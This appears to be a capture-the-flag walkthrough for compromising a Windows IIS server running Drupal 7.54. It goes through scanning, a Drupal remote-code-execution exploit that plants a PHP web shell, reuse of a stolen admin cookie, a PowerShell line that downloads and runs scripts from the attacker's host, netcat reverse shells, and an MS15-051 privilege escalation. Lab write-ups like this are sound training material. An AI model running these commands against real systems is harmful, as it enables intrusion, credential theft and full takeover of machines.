nmap -sC -sV 10.10.10.9

ports open:
80 ---> http IIs 7.5: google 'IIS versions' > win7/win server 2008 | drupale 7
135 ---> rpc
49154

go to http://10.10.10.9 ---> drupal : run droopescan ---> an updated scannimg tool for drupal CMS
* download at https://github.com/droope/droopescan
command: ./droopescan scan drupal -u 10.10.10.9 (takes a long time)

http://10.10.10.9/CHANGELOG.txt ---> shows : drupal 7.54 version
google: drupale 7.54 exploits

>searchsploit drupal:
7.X module services - remote code executaion
> searchsploit -x <exploits_path>
> searchsploit -p <explots_path> ---> copys to clipboard
change the php exploit code:
----------------------------
$url='http://10.10.10.9/' & $endpoint_path='/rest' & 'filename'=> 'katomi.php' & 'data' => '<?php SYSTEM...basically an php reverse shell...?>'

run exploit> php exploit.php ---> if fails : set on burps proxy options a redirect and adjust script > now run exploit again and examin the traffic

 when works ,file created at : http://10.10.10.9/katomi.php ----> run commands : http://10.10.10.9/katomi.php?cmd=dir
** also 2 files were created : 
seesion.json ---> with info of admin cookie- if insert cookie to browser we will login ti http://10.10.10.9 as admin 
user.json ---> with username:admin and password:<hashed_password>

katomi.php?cmd=systeminfo ---> to see info about the system and mainly if X64 or X86


>locate PowerUp.ps1 ---> copy file to current folder
* edit: add to file in the end : Invoke-AllChecks
** run python webserver : python -m SimpleHTTPServer
*** katomi.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString('http://<host_ip_addr>/PowerUp.ps1') | powershell -noprofile -     >>>> its download the scripts and executes it
--------> dont realy shows results
 
>locate Sherlock.ps1
**do the same as with PowerUp.ps1 and see results

download netcat X64 for windows 

use the drupal exploit to upload ncx64.exe
set netcat listner on host
on RCE in browser: katomi.php?cmd=nc64.exe -e cmd <host_ip_addr> 1337

and GET U S E R !

==============================

PE:
---

search google: 'ms15-051 proof of concept'
go to github link and download the compiled win version (or the zip file with the compiled exe)

set listener with netcat
transfer exploit and run in victim : exploit.exe "nc64.exe -e cmd <host_ip_addr> 4444"

and GOT R O O T !


